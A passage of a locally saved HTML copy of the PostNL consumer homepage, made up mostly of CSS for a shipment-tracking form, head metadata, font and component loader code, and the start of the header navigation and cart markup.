initial; backface-visibility: initial; transform-box: initial; transform-style: initial; transform-origin: initial; contain: initial; content-visibility: initial; container: initial; appearance: initial; -moz-orient: initial; will-change: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; touch-action: initial; -webkit-line-clamp: initial; scrollbar-gutter: initial; zoom: initial; columns: initial; column-fill: initial; column-rule: initial; column-span: initial; content: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; opacity: initial; box-shadow: initial; clip: initial; filter: initial; backdrop-filter: initial; mix-blend-mode: initial; font-style: initial; font-variant: initial; font-weight: initial; font-size-adjust: initial; font-synthesis: initial; font-stretch: initial; font-kerning: initial; font-variation-settings: initial; font-language-override: initial; font-optical-sizing: initial; font-palette: initial; math-depth: initial; math-style: initial; line-height: initial; visibility: initial; writing-mode: initial; text-orientation: initial; print-color-adjust: initial; image-rendering: initial; image-orientation: initial; dominant-baseline: initial; text-anchor: initial; color-interpolation: initial; color-interpolation-filters: initial; fill: initial; fill-opacity: initial; fill-rule: initial; shape-rendering: initial; stroke: initial; stroke-width: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-dasharray: initial; stroke-dashoffset: initial; clip-rule: initial; marker: initial; paint-order: initial; border-collapse: initial; empty-cells: initial; caption-side: initial; border-spacing: initial; text-transform: initial; hyphens: initial; -moz-text-size-adjust: initial; text-indent: initial; overflow-wrap: initial; word-break: initial; text-justify: initial; text-align-last: initial; text-align: initial; letter-spacing: initial; word-spacing: initial; white-space: initial; text-shadow: initial; text-emphasis: initial; text-emphasis-position: initial; tab-size: initial; line-break: initial; -webkit-text-fill-color: initial; -webkit-text-stroke: initial; ruby-align: initial; ruby-position: initial; text-combine-upright: initial; text-rendering: initial; text-underline-offset: initial; text-underline-position: initial; text-decoration-skip-ink: initial; hyphenate-character: initial; forced-color-adjust: initial; -webkit-text-security: initial; hyphenate-limit-chars: initial; text-wrap: initial; cursor: initial; pointer-events: initial; caret-color: initial; accent-color: initial; color-scheme: initial; scrollbar-color: initial; list-style: initial; quotes: initial; margin: initial; overflow-clip-margin: initial; scroll-margin: initial; outline: initial; outline-offset: initial; padding: initial; scroll-padding: initial; page: initial; inset: initial; z-index: initial; flex-flow: initial; place-content: initial; place-items: initial; flex: initial; place-self: initial; order: initial; height: initial; min-height: initial; max-height: initial; width: initial; min-width: initial; max-width: initial; box-sizing: initial; object-fit: initial; object-position: initial; grid-area: initial; grid: initial; gap: initial; aspect-ratio: initial; contain-intrinsic-size: initial; vector-effect: initial; stop-color: initial; stop-opacity: initial; flood-color: initial; flood-opacity: initial; lighting-color: initial; mask-type: initial; clip-path: initial; mask: initial; x: initial; y: initial; cx: initial; cy: initial; rx: initial; ry: initial; r: initial; d: initial; table-layout: initial; text-overflow: initial; text-decoration: initial; ime-mode: initial; scrollbar-width: initial; user-select: initial; -moz-window-dragging: initial; -moz-force-broken-image-icon: initial; transition: initial; animation: initial; animation-composition: initial; -moz-box-align: initial; -moz-box-direction: initial; -moz-box-flex: initial; -moz-box-orient: initial; -moz-box-pack: initial; -moz-box-ordinal-group: initial; color: rgb(31, 30, 47); font-family: &quot;Hanken Grotesk&quot;, Arial, Helvetica, sans-serif; font-feature-settings: &quot;ss03&quot;, &quot;ss01&quot;; font-size: 16px; }

* { box-sizing: border-box; }

.pnl-shipment__wrapper { display: flex; flex-direction: column; justify-content: center; gap: 1.5rem; box-sizing: border-box; }

@media (min-width: 57em) {
  .pnl-shipment__wrapper { gap: 0.5em; }
  .pnl-shipment__wrapper:not(.is-stacked) { flex-direction: row; align-items: flex-start; justify-content: center; gap: 2rem; }
  .pnl-shipment__wrapper:not(.is-stacked):has(.is-invalid) { margin-bottom: 1em; }
}

.pnl-shipment__wrapper.is-stacked { align-items: flex-start; }

.pnl-shipment__button-wrapper { position: relative; }

@media (min-width: 57em) {
  .pnl-shipment__button-wrapper { display: grid; grid-template-rows: 27px 40px 27px; }
}

@media (max-width: 57em) {
  .pnl-shipment__button-wrapper { width: 100%; margin-top: 0.5em; }
}

.pnl-shipment__button { grid-area: 2 / 3; position: relative; display: inline-flex; block-size: 40px; inline-size: 100%; align-items: center; padding: 8px 24px; justify-content: center; color: rgb(255, 255, 255); border-radius: 0.25rem; border: 1px solid rgb(97, 97, 255); background: rgb(97, 97, 255); font-family: &quot;Hanken Grotesk&quot;, Arial, Helvetica, sans-serif; font-feature-settings: &quot;ss03&quot;, &quot;ss01&quot;; font-size: 1rem; font-weight: 700; cursor: pointer; user-select: none; appearance: none; }

@media (max-width: 57em) {
  .pnl-shipment__button { display: flex; }
}

.pnl-shipment__button:hover { text-decoration: underline; text-underline-offset: 0.15em; }

.pnl-shipment__button:focus { outline: none; }

.pnl-shipment__button:focus-visible { outline: rgb(0, 26, 115) solid 2px; outline-offset: 1px; }

.pnl-shipment__button:active { background-color: rgb(0, 26, 115); text-decoration: underline; text-underline-offset: 0.15em; }

.pnl-shipment__form-group { position: relative; display: flex; flex-direction: column; justify-content: flex-start; width: 100%; gap: 0.5rem; }

@media (min-width: 57em) {
  .pnl-shipment__form-group--country:not(.is-stacked .pnl-shipment__form-group--country) { max-inline-size: 18rem; }
}

@media (min-width: 57em) {
  .pnl-shipment__form-group--postalcode:not(.is-stacked .pnl-shipment__form-group--postalcode) { max-inline-size: 10rem; }
}

.pnl-shipment__label-wrapper { position: relative; display: flex; align-items: center; }

.pnl-shipment__label { color: rgb(31, 30, 47); text-align: left; font-weight: 700; line-height: 1.2; }

.pnl-shipment__input-wrapper { width: 100%; display: flex; position: relative; flex-direction: column; transition: margin 300ms cubic-bezier(0.4, 0, 0.2, 1); }

.pnl-shipment__input { width: 100%; display: inline-flex; position: relative; height: 40px; padding-block: 0.5rem; padding-inline: 1rem; font-family: &quot;Hanken Grotesk&quot;, Arial, Helvetica, sans-serif; font-feature-settings: &quot;ss03&quot;, &quot;ss01&quot;; font-size: 1rem; font-weight: 300; line-height: 1.5; appearance: none; border: 1px solid rgb(103, 104, 127); border-radius: 0.25em; }

.pnl-shipment__input:hover { border-color: rgb(97, 97, 255); }

.pnl-shipment__input:focus:not(:focus-visible) { outline: none; }

.pnl-shipment__input:focus-visible { outline: rgb(0, 26, 115) solid 2px; outline-offset: 1px; }

.pnl-shipment__input::-webkit-input-placeholder { color: rgb(103, 104, 127); opacity: 1; }

.pnl-shipment__input::placeholder { color: rgb(103, 104, 127); opacity: 1; }

.pnl-shipment__input::placeholder { color: rgb(103, 104, 127); opacity: 1; }

.pnl-shipment__select-wrapper { position: relative; width: 100%; }

@media (min-width: 57em) {
  .pnl-shipment__select-wrapper:not(.is-stacked .pnl-shipment__select-wrapper) { max-width: 18em; }
}

.pnl-shipment__select-wrapper option { font-weight: 300; }

.pnl-shipment__select-wrapper.active { border-radius: 0.25em 0.25em 0px 0px; }

.pnl-shipment__select-wrapper.active::before { border-width: medium 4px 6px; border-style: none solid solid; border-color: currentcolor transparent rgb(103, 104, 127); }

.pnl-shipment__select-text { width: 100%; font-weight: 300; font-size: 1rem; font-family: &quot;Hanken Grotesk&quot;, Arial, Helvetica, sans-serif; font-feature-settings: &quot;ss03&quot;, &quot;ss01&quot;; height: 40px; padding: 0px 8px 0px 16px; border: 1px solid rgb(103, 104, 127); border-radius: 4px; background-color: rgb(255, 255, 255); background-image: url(&quot;ec9778d2bf5e988bfa9bb00fb8236b4e30beca01.svg&quot;); background-repeat: no-repeat, repeat; background-position: right 0.7em top 50%, 0px 0px; background-size: 24px; appearance: none; -webkit-text-fill-color: rgb(31, 30, 47); }

.pnl-shipment__select-text:hover { border-color: rgb(97, 97, 255); }

.pnl-shipment__select-text:focus:not(:focus-visible) { outline: none; }

.pnl-shipment__select-text:focus-visible { outline: rgb(0, 26, 115) solid 2px; outline-offset: 1px; }

.pnl-shipment__select-text::-webkit-input-placeholder { color: rgb(103, 104, 127); opacity: 1; }

.pnl-shipment__select-text::placeholder { color: rgb(103, 104, 127); opacity: 1; }

.pnl-shipment__select-text::placeholder { color: rgb(103, 104, 127); opacity: 1; }

.pnl-shipment__error-wrapper { display: flex; align-items: center; flex-direction: row; }

.pnl-shipment__error-wrapper.is-hidden { display: none; }

.pnl-shipment__error { position: relative; flex-basis: 100%; height: auto; margin: auto 0px 0px; padding-left: 20px; color: rgb(215, 0, 54); text-align: left; font-size: 0.875rem; font-weight: 700; transform-origin: 100% 0px 0px; }

.pnl-shipment__error::before { content: &quot;&quot;; display: block; position: absolute; top: 0px; left: 0px; width: 16px; height: 16px; background-image: url(&quot;2dacb17e253a4b7e97d13ac16a659e204d58ad90.svg&quot;); background-size: 16px; background-repeat: no-repeat; background-position: center center; text-align: center; }"><head><meta charset="UTF-8"><style data-styles="">slot-fb{display:contents}slot-fb[hidden]{display:none}shop-add-to-cart,shop-banner-product,shop-mini-cart,shop-mini-cart-flyout,shop-mini-cart-visual,shop-price,shop-product,shop-theme-provider,shop-toastr{visibility:hidden}.hydrated{visibility:inherit}</style><style data-styles="">slot-fb{display:contents}slot-fb[hidden]{display:none}swp-chatbot-banner,swp-chatbot-banner-card,swp-chatbot-window{visibility:hidden}.hydrated{visibility:inherit}</style><style data-styles="">slot-fb{display:contents}slot-fb[hidden]{display:none}pnl-address-form,pnl-address-input-component,pnl-address-lookup,pnl-address-message,pnl-address-open-input-component,pnl-address-postalcode-darkmode-component,pnl-address-submit-button,pnl-postalcode-lookup,pnl-postalcode-widget-lookup,pnl-tab-component{visibility:hidden}.hydrated{visibility:inherit}</style><style data-styles="">slot-fb{display:contents}slot-fb[hidden]{display:none}pnl-close-button,pnl-locations-alert-component,pnl-locations-component,pnl-locations-darkmode-component,pnl-locations-details-component,pnl-locations-filter-group,pnl-locations-filters-component,pnl-locations-list-component,pnl-locations-list-item-component,pnl-locations-map-component,pnl-locations-modal-component,pnl-locations-opening-dropdown,pnl-locations-popup,pnl-locations-search-component,pnl-locations-sidebar-component,pnl-locations-spinner,pnl-locations-tab-component,pnl-locations-widget{visibility:hidden}.hydrated{visibility:inherit}</style><style data-styles="">slot-fb{display:contents}slot-fb[hidden]{display:none}pnl-api-key-component,pnl-customer-overview-component,pnl-ds-alert-component,pnl-ds-api-availability-component,pnl-ds-autocomplete-component,pnl-ds-autocomplete-country-component,pnl-ds-card-component,pnl-ds-card-header,pnl-ds-card-notes,pnl-ds-card-price,pnl-ds-card-usps,pnl-ds-darkmode-component,pnl-ds-email-sent-component,pnl-ds-input-component,pnl-ds-kvk-form,pnl-ds-kvk-search-component,pnl-ds-loading,pnl-ds-magic-entry-component,pnl-ds-new-customer-component,pnl-ds-open-input-component,pnl-ds-postalcode-table-component,pnl-ds-postalcode-wizard-component,pnl-ds-products-component,pnl-ds-request-finalize-component,pnl-ds-request-finished-component,pnl-ds-select-component,pnl-ds-select-option-component,pnl-ds-service-failed,pnl-ds-start-addresscheck-component,pnl-ds-test-api-component,pnl-ds-web2lead,pnl-ds-web2lead-script,pnl-extras-list-component,pnl-intro-titles-component,pnl-postalcode-confirmation-component,pnl-request-magic-link-component,pnl-select-company-component,pnl-send-request-component,pnl-tooltip-component{visibility:hidden}.hydrated{visibility:inherit}</style><style data-styles="">pnl-amount-select-component,pnl-rates,pnl-rates-business,pnl-rates-business-normal-rates,pnl-rates-business-product,pnl-rates-loading,pnl-rates-product,pnl-rates-select-component,pnl-rates-widget,pnl-select-autocomplete{visibility:hidden}.hydrated{visibility:inherit}</style><style data-styles="">slot-fb{display:contents}slot-fb[hidden]{display:none}pnl-ds-forms-alert-component,pnl-ds-forms-input-component,pnl-ds-forms-lost-code-component,pnl-ds-forms-subscribe-post-component,pnl-ds-forms-unsubscribe-post-component,pnl-jarigejob-alert,pnl-jarigejob-confirmation,pnl-jarigejob-entryform,pnl-jarigejob-form,pnl-jarigejob-validation{visibility:hidden}.hydrated{visibility:inherit}</style><style data-styles="">slot-fb{display:contents}slot-fb[hidden]{display:none}pnl-vacancy-accordion-component,pnl-vacancy-accordion-item-component,pnl-vacancy-alert,pnl-vacancy-application-checkbox,pnl-vacancy-application-component,pnl-vacancy-application-confirmation-component,pnl-vacancy-application-form-component,pnl-vacancy-application-radio,pnl-vacancy-banner,pnl-vacancy-card-component,pnl-vacancy-chips-component,pnl-vacancy-contact-card,pnl-vacancy-contact-component,pnl-vacancy-content-component,pnl-vacancy-criteria-form-component,pnl-vacancy-cta-component,pnl-vacancy-darkmode-component,pnl-vacancy-details-component,pnl-vacancy-faq-component,pnl-vacancy-filter-component,pnl-vacancy-filter-item-component,pnl-vacancy-image,pnl-vacancy-input-component,pnl-vacancy-intern-application-form-component,pnl-vacancy-intro-component,pnl-vacancy-item-component,pnl-vacancy-job-alert-component,pnl-vacancy-job-alert-panel-component,pnl-vacancy-list-component,pnl-vacancy-loader-component,pnl-vacancy-modal-component,pnl-vacancy-operational-application-component,pnl-vacancy-operational-banner-component,pnl-vacancy-operational-details-component,pnl-vacancy-operational-video-component,pnl-vacancy-overview-component,pnl-vacancy-paging-component,pnl-vacancy-payoff,pnl-vacancy-proces-component,pnl-vacancy-professional-application-form-component,pnl-vacancy-professional-details-component,pnl-vacancy-professional-video-component,pnl-vacancy-regular-job-description,pnl-vacancy-salary-calculator,pnl-vacancy-select-component,pnl-vacancy-share-component,pnl-vacancy-spark,pnl-vacancy-textarea-component,pnl-vacancy-toggle,pnl-vacancy-trainee-application-form-component,pnl-vacancy-upload-component{visibility:hidden}.hydrated{visibility:inherit}</style><style data-styles="">postnl-crypto-product,postnl-crypto-product-container,postnl-crypto-stepper{visibility:hidden}.hydrated{visibility:inherit}</style><style data-styles="">pnl-chatbot-trigger,pnl-chatbot-button,pnl-chatbot-floating-button,pnl-header,pnl-cookie-wall-widget,pnl-shipment-search,pnl-chatbot-faq,pnl-footer,pnl-whats-new,pnl-shipment-input,pnl-user-menu,pnl-business-user-menu,pnl-consumer-user-menu,pnl-language-selector,pnl-user-menu-item-list,pnl-focus-header,pnl-cookie-widget-settings,pnl-cookie-widget-overview,pnl-desktop-navigation,pnl-mobile-navigation,pnl-ie11-warning,pnl-chatbot-container,pnl-chatbot-messages-container,pnl-input-field,pnl-chatbot-case-overview-container,pnl-chatbot-close-container,pnl-chatbot-date-picker,pnl-chatbot-header,pnl-chatbot-notification,pnl-chatbot-option-buttons,pnl-chatbot-sound,pnl-chatbot-upload-file-button,pnl-chatbot-quick-replies,pnl-chatbot-upload-file-paperclip,pnl-loader,pnl-chatbot-trigger-aurora,pnl-chatbot-trigger-auto-open,pnl-chatbot-trigger-banner,pnl-chatbot-trigger-contact-card,pnl-chatbot-trigger-default-call-to-action,pnl-chatbot-trigger-offline,pnl-navigation-menu,pnl-search,pnl-navigation-main-menu,pnl-navigation-sub-menu{visibility:hidden}.hydrated{visibility:inherit}</style><meta name="viewport" content="width=device-width"><link rel="icon" href="favicon-postnl-32.png" sizes="any"><link rel="icon" href="favicon-postnl-16.png" sizes="16x16"><link rel="icon" href="favicon-postnl-32.png" sizes="32x32"><link rel="icon" href="favicon-postnl-192.png" sizes="192x192"><link rel="icon" href="favicon-postnl-384.png" sizes="384x384"><title>Wij zijn PostNL en we bezorgen bijzondere momenten. Tot snel | PostNL</title><meta property="og:title" content="Wij zijn PostNL en we bezorgen bijzondere momenten. Tot snel | PostNL"><meta property="og:description" content="PostNL: je betrouwbare partner voor post- en pakketbezorging, zowel zakelijk als particulier. Bekijk onze diensten en verstuur of volg zendingen wereldwijd."><meta name="description" content="PostNL: je betrouwbare partner voor post- en pakketbezorging, zowel zakelijk als particulier. Bekijk onze diensten en verstuur of volg zendingen wereldwijd."><link rel="canonical" href="https://www.postnl.nl/"><link rel="alternate" href="https://www.postnl.nl/" hreflang="nl-nl"><link rel="alternate" href="https://www.postnl.nl/en/" hreflang="en-gb"><meta name="personalization:title" content="Personalisatie titel"><meta name="personalization:subtitle" content="Subtitel"><meta name="personalization:link" content="Link"><meta name="personalization:image" content="/api/assets/blt43aa441bfc1e29f2/blt5ed5200e99d1e126/62ea6feddfd4400f7c548285/PostNL_International_Kerkplein_129.jpg"><meta name="personalization:imagedesktop" content="/api/assets/blt43aa441bfc1e29f2/blt45fea586f54fff1f/62ea72e5e424310f0b326f2f/internationaal-versturen(1)_tcm10-208055.jpg"><meta name="personalization:imagemobile" content="/api/assets/blt43aa441bfc1e29f2/blt45fea586f54fff1f/62ea72e5e424310f0b326f2f/internationaal-versturen(1)_tcm10-208055.jpg"><meta name="personalization:status" content="Personalized"><meta name="robots" content="index, follow"><meta charset="utf-8"><meta name="next-head-count" content="28"><link rel="stylesheet" href="ec63c386c55c170d.css" data-n-g=""><noscript data-n-css=""></noscript><style>@font-face{font-family:PostNL;src:url("") format("woff2");font-weight:700;font-style:italic}@font-face{font-family:PostNL;src:url("") format("woff2");font-weight:700;font-style:normal}@font-face{font-family:PostNL;src:url("") format("woff2");font-weight:400;font-style:italic}@font-face{font-family:PostNL;src:url("") format("woff2");font-weight:400;font-style:normal}@font-face{font-family:PostNL;src:url("") format("woff2");font-weight:300;font-style:italic}@font-face{font-family:PostNL;src:url("") format("woff2");font-weight:300;font-style:normal}@font-face{font-family:Hanken Grotesk;src:url("") format("woff2")}@font-face{font-family:ABC ROM;src:url("")format("woff2")}</style><script src="status-updater.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script><script data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement {}); } })(["shop-theme-provider","shop-mini-cart-visual","shop-mini-cart","pnl-user-menu-item-list","pnl-consumer-user-menu","pnl-user-menu","pnl-shipment-input","pnl-shipment-search","pnl-cookie-wall-widget","shop-messages","shop-toastr","next-route-announcer"])</script></head><body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6IntlMjVmYjcwZC0zODkyLTQ1NmYtYTY5OC1mOGY4YmQ3NDllMjN9IiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMS45LjEwIiwic2NvcmUiOjEwOTEwfV0="><div id="__next" bis_skin_checked="1"><div id="postnl-cookie-widget" bis_skin_checked="1"></div><div class="stamp-provider stamp-theme-light" bis_skin_checked="1"><div class=" easter" bis_skin_checked="1"><div class="home" bis_skin_checked="1"><style>#nprogress{pointer-events:none}#nprogress .bar{background:#f56900;position:fixed;z-index:1031;top:0;left:0;width:100%;height:5px}#nprogress .peg{display:block;position:absolute;right:0;width:100px;height:100%;;opacity:1;-webkit-transform:rotate(3deg) translate(0px,-4px);-ms-transform:rotate(3deg) translate(0px,-4px);transform:rotate(3deg) translate(0px,-4px)}#nprogress .spinner{display:block;position:fixed;z-index:1031;top:15px;right:15px}#nprogress .spinner-icon{width:18px;height:18px;box-sizing:border-box;border:2px solid transparent;border-top-color:#f56900;border-left-color:#f56900;border-radius:50%;-webkit-animation:nprogress-spinner 400ms linear infinite;animation:nprogress-spinner 400ms linear infinite}.nprogress-custom-parent{overflow:hidden;position:relative}.nprogress-custom-parent #nprogress .bar,.nprogress-custom-parent #nprogress .spinner{position:absolute}@-webkit-keyframes nprogress-spinner{0%{-webkit-transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg)}}@keyframes nprogress-spinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style><div class="stamp-skip-links" bis_skin_checked="1"><a class="stamp-skip-link" id="skiplink-to-content" href="#main-content" tabindex="1">Direct naar hoofdinhoud</a></div><link rel="stylesheet" type="text/css" href="postnl-fonts.css"><div class="header__universal--top" bis_skin_checked="1"><div class="header-container header-container--universal" bis_skin_checked="1"><header class="header header__universal header-desktop"><div class="header-desktop__top" bis_skin_checked="1"><div class="inner" bis_skin_checked="1"><div class="header-desktop__top-left" bis_skin_checked="1"><div class="switch" bis_skin_checked="1"><a class="switch__item switch__item--active" aria-current="true" href="https://www.postnl.nl/">Consument</a><a class="switch__item switch__item--inactive" aria-current="false" href="https://www.postnl.nl/zakelijk/">Zakelijk</a></div></div><div class="header-desktop__top-right" bis_skin_checked="1"><div class="language-component" bis_skin_checked="1"><button type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-:Rklt5m:" data-state="closed" class="pci-popover__trigger">NL<!-- --> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></button></div><span class="shopping-cart"><shop-mini-cart data-language="nl" class="hydrated" data-scrapbook-adoptedstylesheets="0,1,2" data-scrapbook-shadowdom="<shop-theme-provider class=&quot;hydrated&quot;><!----><div class=&quot;stamp-provider stamp-theme-light&quot;><shop-mini-cart-visual class=&quot;hydrated&quot;><div class=&quot;shop-mini-cart-visual&quot;><div class=&quot;shop-mini-cart-visual-trigger shop-mini-cart-visual-trigger--mobile stamp-icon-button&quot;><button class=&quot;stamp-icon-button__button stamp-icon-button__button--variant-tertiary stamp-icon-button__button--size-m&quot;><span class=&quot;stamp-icon stamp-icon--size-m&quot; role=&quot;presentation&quot;><span aria-hidden=&quot;true&quot; class=&quot;stamp-icon__content&quot;><svg viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;><path fill-rule=&quot;evenodd&quot; clip-rule=&quot;evenodd&quot; d=&quot;M8.7978 17.7136C8.7978 18.3443 8.29082 18.8574 7.66791 18.8574C7.04462 18.8574 6.53764 18.3443 6.53764 17.7136C6.53764 17.0829 7.04462 16.5698 7.66791 16.5698C8.29082 16.5698 8.7978 17.0829 8.7978 17.7136ZM16.6547 16.5813C17.275 16.5813 17.7794 17.0916 17.7794 17.7193C17.7794 18.347 17.275 18.8574 16.6547 18.8574C16.0348 18.8574 15.5305 18.347 15.5305 17.7193C15.5305 17.0916 16.0348 16.5813 16.6547 16.5813ZM3.17732 4.00322C3.14141 4.00322 3.10577 4.00239 3.07061 4.00158C2.88574 3.99729 2.71404 3.99331 2.58565 4.11139C2.38203 4.2984 2 4.9615 2 5.03882C2 5.07272 2.00979 5.14585 2.04103 5.14585H3.98954L6.85982 15.5811C6.01221 15.9109 5.4085 16.7412 5.4085 17.7136C5.4085 18.9743 6.42209 20 7.66791 20C8.71801 20 9.60099 19.2695 9.85279 18.2849L14.4755 18.2902C14.7269 19.2718 15.6073 20 16.6547 20C17.8975 20 18.9085 18.977 18.9085 17.7193C18.9085 16.4617 17.8975 15.4386 16.6547 15.4386C15.6076 15.4386 14.7277 16.1665 14.4759 17.1476L9.85279 17.1423C9.62772 16.2628 8.89905 15.5883 7.99686 15.4542L7.67581 14.2869H16.1613C16.4037 14.2869 16.6194 14.1303 16.6965 13.8972L18.9702 7.04147C19.0929 6.6724 18.8212 6.28847 18.435 6.28847H6.72884C6.6976 6.28847 6.68781 6.36275 6.68781 6.39664C6.68781 6.47396 7.06984 7.13821 7.27346 7.32522C7.40067 7.44222 7.5704 7.4378 7.75333 7.43303L7.75335 7.43303C7.79015 7.43207 7.82749 7.4311 7.86513 7.4311H17.6503L15.7552 13.1442H7.36153L4.96211 4.42142C4.89436 4.17423 4.67192 4.00322 4.41824 4.00322H3.17732ZM12.7246 8.6974C12.5965 8.5795 12.4251 8.58356 12.2406 8.58792C12.2051 8.58876 12.1692 8.58961 12.133 8.58961H7.70863C7.67739 8.58961 7.66761 8.6635 7.66761 8.6974C7.66761 8.7751 8.04963 9.43896 8.25325 9.62597C8.38051 9.74333 8.55032 9.73892 8.73333 9.73416C8.77007 9.73321 8.80735 9.73224 8.84492 9.73224H11.6448H13.2693C13.3005 9.73224 13.3103 9.65911 13.3103 9.62521C13.3103 9.54751 12.9283 8.88441 12.7246 8.6974ZM8.76362 10.8629H12.133C12.1706 10.8629 12.208 10.8619 12.2448 10.861C12.4277 10.8562 12.5974 10.8518 12.7246 10.9688C12.9283 11.1562 13.3103 11.82 13.3103 11.8974C13.3103 11.9313 13.3005 12.0055 13.2693 12.0055H9.89992C9.86371 12.0055 9.82778 12.0064 9.79234 12.0072C9.6078 12.0116 9.43644 12.0156 9.30825 11.8977C9.10462 11.7104 8.7226 11.0472 8.7226 10.9699C8.7226 10.936 8.73238 10.8629 8.76362 10.8629Z&quot; fill=&quot;currentColor&quot;></path></svg></span><span class=&quot;sr-only&quot;></span></span></button></div><div class=&quot;shop-mini-cart-visual-trigger shop-mini-cart-visual-trigger--desktop stamp-icon-button&quot;><button class=&quot;stamp-icon-button__button stamp-icon-button__button--variant-tertiary stamp-icon-button__button--size-m&quot;><span class=&quot;stamp-icon stamp-icon--size-m&quot; role=&quot;presentation&quot;><span aria-hidden=&quot;true&quot; class=&quot;stamp-icon__content&quot;><svg viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;><path fill-rule=&quot;evenodd&quot; clip-rule=&quot;evenodd&quot; d=&quot;M8.7978 17.7136C8.7978 18.3443 8.29082 18.8574 7.66791 18.8574C7.04462 18.8574 6.53764 18.3443 6.53764 17.7136C6.53764 17.0829 7.04462 16.5698 7.66791 16.5698C8.29082 16.5698 8.7978 17.0829 8.7978 17.7136ZM16.6547 16.5813C17.275 16.5813 17.7794 17.0916 17.7794 17.7193C17.7794 18.347 17.275 18.8574 16.6547 18.8574C16.0348 18.8574 15.5305 18.347 15.5305 17.7193C15.5305 17.0916 16.0348 16.5813 16.6547 16.5813ZM3.17732 4.00322C3.14141 4.00322 3.10577 4.00239 3.07061 4.00158C2.88574 3.99729 2.71404 3.99331 2.58565 4.11139C2.38203 4.2984 2 4.9615 2 5.03882C2 5.07272 2.00979 5.14585 2.04103 5.14585H3.98954L6.85982 15.5811C6.01221 15.9109 5.4085 16.7412 5.4085 17.7136C5.4085 18.9743 6.42209 20 7.66791 20C8.71801 20 9.60099 19.2695 9.85279 18.2849L14.4755 18.2902C14.7269 19.2718 15.6073 20 16.6547 20C17.8975 20 18.9085 18.977 18.9085 17.7193C18.9085 16.4617 17.8975 15.4386 16.6547 15.4386C15.6076 15.4386 14.7277 16.1665 14.4759 17.1476L9.85279 17.1423C9.62772 16.2628 8.89905 15.5883 7.99686 15.4542L7.67581 14.2869H16.1613C16.4037 14.2869 16.6194 14.1303 16.6965 13.8972L18.9702 7.04147C19.0929 6.6724 18.8212 6.28847 18.435 6.28847H6.72884C6.6976 6.28847 6.68781 6.36275 6.68781 6.39664C6.68781 6.47396 7.06984 7.13821 7.27346 7.32522C7.40067 7.44222 7.5704 7.4378 7.75333 7.43303L7.75335 7.43303C7.79015 7.43207 7.82749 7.4311 7.86513 7.4311H17.6503L15.7552 13.1442H7.36153L4.96211 4.42142C4.89436 4.17423 4.67192 4.00322 4.41824 4.00322H3.17732ZM12.7246 8.6974C12.5965 8.5795 12.4251 8.58356 12.2406 8.58792C12.2051 8.58876 12.1692 8.58961 12.133 8.58961H7.70863C7.67739 8.58961 7.66761 8.6635 7.66761 8.6974C7.66761 8.7751 8.04963 9.43896 8.25325 9.62597C8.38051 9.74333 8.55032 9.73892 8.73333 9.73416C8.77007 9.73321 8.80735 9.73224 8.84492 9.73224H11.6448H13.2693C13.3005 9.73224 13.3103 9.65911 13.3103 9.62521C13.3103 9.54751 12.9283 8.88441 12.7246 8.6974ZM8.76362 10.8629H12.133C12.1706 10.8629 12.208 10.8619 12.2448 10.861C12.4277 10.8562 12.5974 10.8518 12.7246 10.9688C12.9283 11.1562 13.3103 11.82 13.3103 11.8974C13.3103 11.9313 13.3005 12.0055 13.2693 12.0055H9.89992C9.86371 12.0055 9.82778 12.0064 9.79234 12.0072C9.6078 12.0116 9.43644 12.0156 9.30825 11.8977C9.10462 11.7104 8.7226 11.0472 8.7226 10.9699C8.7226 10.936 8.73238 10.8629 8.76362 10.8629Z&quot; fill=&quot;currentColor&quot;></path></svg></span><span class=&quot;sr-only&quot;></span></span></button></div></div></shop-mini-cart-visual></div></shop-theme-provider>"></shop-mini-cart></span></div></div></div><div class="header-desktop__bottom" bis_skin_checked="1"><div class="inner" bis_skin_checked="1"><div class="header-desktop__bottom-left" bis_skin_checked="1"><a class="header__universal--homelink" rel="Homepage" href="https://www.postnl.nl/"><img src="logo-postnl-outline.svg" alt="Postnl.nl"></a><div class="hide-mobile" bis_skin_checked="1"><nav class="main-nav main-nav--consumer" id="desktop-main-navigation" aria-label="Hoofdmenu"><ul class="main-nav__list main-nav__list--lvl-1"><li class="main-nav__item"><div class="main-nav__item-wrapper" bis_skin_checked="1"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" id="menu-item-Versturen" href="https://www.postnl.nl/versturen/"><span class="stamp-link__content">Versturen</span></a><button class="main-nav__trigger stamp-link" aria-expanded="false" aria-controls="menu-item-desktop-main-navigation"><span class="visually-hidden">Open submenu</span><span class="stamp-link__content"><div class="stamp-link__icon stamp-link__icon--end" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.32431 21.624L17.5719 13.1431C18.1388 12.56 18.1432 11.6349 17.5819 11.0464L9.34896 